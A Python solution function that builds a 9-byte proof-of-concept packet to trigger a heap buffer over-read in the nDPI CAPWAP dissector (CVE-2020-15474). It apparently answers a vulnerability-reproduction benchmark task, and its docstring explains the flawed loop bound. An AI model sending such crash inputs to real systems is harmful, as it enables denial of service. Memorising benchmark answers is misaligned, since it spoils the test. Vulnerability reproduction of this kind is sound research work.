class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input to trigger a heap buffer over-read
        in the nDPI CAPWAP dissector (CVE-2020-15474).

        The vulnerability exists in a loop processing message elements in CAPWAP
        data packets. The loop condition `while(offset < capwap_len)` allows entry
        even when there are fewer than 4 bytes remaining in the buffer, leading
        to an out-of-bounds read when parsing the next message element's header.

        This PoC constructs a minimal 9-byte packet to trigger the vulnerability.
        - An 8-byte CAPWAP header sets header length (hlen) to 2 (8 bytes).
          - The first byte is 0x11, which signifies a Data packet and sets hlen=2.
        - A single trailing byte makes the total length 9.
        
        The dissector starts message processing at offset 8. The loop condition
        `while(8 < 9)` is true. The subsequent 2-byte read from `payload[8]` for
        the message element type accesses `payload[9]`, which is out-of-bounds,
        triggering the crash.
        """
        
        # 8-byte CAPWAP header.
        # byte 0 (0x11) ensures type=Data and hlen=2.
        header = b'\x11' + b'\x00' * 7
        
        # 1-byte payload to make total length 9.
        # This triggers an OOB read at the start of the message processing loop.
        poc = header + b'\x00'
        
        return poc